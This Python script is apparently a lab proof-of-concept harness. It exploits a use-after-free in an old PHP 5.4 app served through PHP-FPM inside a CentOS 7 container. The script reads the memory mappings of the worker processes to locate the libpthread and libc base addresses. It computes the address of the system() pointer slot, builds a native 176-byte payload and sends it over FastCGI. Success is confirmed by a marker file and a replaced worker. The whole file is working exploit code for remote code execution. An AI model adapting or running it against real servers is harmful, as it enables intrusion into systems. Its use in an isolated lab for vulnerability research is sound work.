#!/usr/bin/env python3
"""Run the native 176-byte payload through PHP-FPM and verify worker replacement."""
from __future__ import annotations

import argparse
import hashlib
import json
import secrets
import subprocess
import sys
import time
from pathlib import Path

HERE = Path(__file__).resolve().parent
ROOT = HERE.parents[1]
sys.path.insert(0, str(ROOT))

from poc.build_payload import build_exec  # noqa: E402
from lab.centos7.lab_runtime import (  # noqa: E402
    dynamic_symbol_offset,
    mapping_bases,
    marker_stat,
    podman_exec,
    read_qword,
    relocation_offset,
    select_mapping,
    top_processes,
    wait_for_process,
)

LIBPTHREAD = "/lib64/libpthread-2.17.so"
LIBC = "/lib64/libc-2.17.so"


def workers(container: str) -> list:
    return [process for process in top_processes(container) if "php-fpm: pool www" in process.args]


def run_case(*, container: str, run_dir: Path, timeout: float = 10.0) -> dict[str, object]:
    run_dir = run_dir.resolve()
    run_dir.mkdir(parents=True, exist_ok=True)
    token = secrets.token_hex(2)[:3]
    marker = run_dir / token
    payload_path = run_dir / f"{token}.bin"
    command = f">/x/{token}".encode("ascii")
    for path in (marker, payload_path):
        if path.exists() or path.is_symlink():
            path.unlink()

    if not workers(container):
        subprocess.run(
            ["podman", "exec", "-d", container, "/usr/sbin/php-fpm", "-F", "-R"],
            check=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
    wait_for_process(container, lambda item: "php-fpm: pool www" in item.args, timeout=10.0)
    before_workers = workers(container)
    if not before_workers:
        raise RuntimeError("no PHP-FPM workers found")

    layouts = []
    for worker in before_workers:
        bases = mapping_bases(worker.host_pid)
        pthread_base, pthread_path = select_mapping(bases, ("libpthread-", "libpthread.so"))
        libc_base, libc_path = select_mapping(bases, ("libc-", "libc.so"))
        layouts.append((worker, pthread_base, pthread_path, libc_base, libc_path))
    if len({entry[1] for entry in layouts}) != 1 or len({entry[3] for entry in layouts}) != 1:
        raise RuntimeError("FPM workers do not share the same pthread/libc mappings")

    representative, pthread_base, pthread_path, libc_base, libc_path = layouts[0]
    slot_offset = relocation_offset(container, LIBPTHREAD, "__libc_system")
    system_offset = dynamic_symbol_offset(container, LIBC, "system")
    slot = pthread_base + slot_offset
    slot_target = read_qword(representative.host_pid, slot)
    expected_system = libc_base + system_offset
    if slot_target != expected_system:
        raise RuntimeError(f"system slot mismatch: {slot_target:#x} != {expected_system:#x}")

    payload = build_exec(command, pthread_base, slot_offset)
    payload_path.write_bytes(payload)
    payload_path.chmod(0o600)
    started = time.monotonic()
    send = podman_exec(
        container,
        [
            "python", "/opt/php54-uaf/fcgi_client.py",
            "127.0.0.1", "9000", "/opt/php54-uaf/vuln_app.php", f"/x/{payload_path.name}",
            "--timeout", str(timeout),
        ],
        check=False,
        timeout=timeout + 5.0,
    )

    deadline = time.monotonic() + 5.0
    after_workers = workers(container)
    before_pids = {worker.host_pid for worker in before_workers}
    while time.monotonic() < deadline:
        after_workers = workers(container)
        after_pids = {worker.host_pid for worker in after_workers}
        if before_pids - after_pids and after_pids - before_pids:
            break
        time.sleep(0.1)
    after_pids = {worker.host_pid for worker in after_workers}
    exited = sorted(before_pids - after_pids)
    replacements = sorted(after_pids - before_pids)
    marker_created = marker.exists()

    result = {
        "case": "fpm-rce",
        "command_hex": command.hex(),
        "payload_bytes": len(payload),
        "payload_sha256": hashlib.sha256(payload).hexdigest(),
        "pthread_path": pthread_path,
        "pthread_base": hex(pthread_base),
        "libc_path": libc_path,
        "libc_base": hex(libc_base),
        "system_slot_offset": hex(slot_offset),
        "system_slot": hex(slot),
        "system_slot_target": hex(slot_target),
        "expected_system": hex(expected_system),
        "workers_before": sorted(before_pids),
        "workers_after": sorted(after_pids),
        "workers_exited": exited,
        "replacement_workers": replacements,
        "client_returncode": send.returncode,
        "client_stdout": send.stdout,
        "client_stderr": send.stderr,
        "elapsed_seconds": round(time.monotonic() - started, 3),
        "marker_created": marker_created,
        "marker": marker_stat(marker) if marker_created else None,
        "success": marker_created and bool(exited) and bool(replacements),
    }
    for path in (marker, payload_path):
        try:
            path.unlink()
        except FileNotFoundError:
            pass
    return result


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--container", required=True)
    parser.add_argument("--run-dir", type=Path, required=True)
    args = parser.parse_args()
    result = run_case(container=args.container, run_dir=args.run_dir)
    print(json.dumps(result, indent=2, sort_keys=True))
    return 0 if result["success"] else 1


if __name__ == "__main__":
    sys.exit(main())
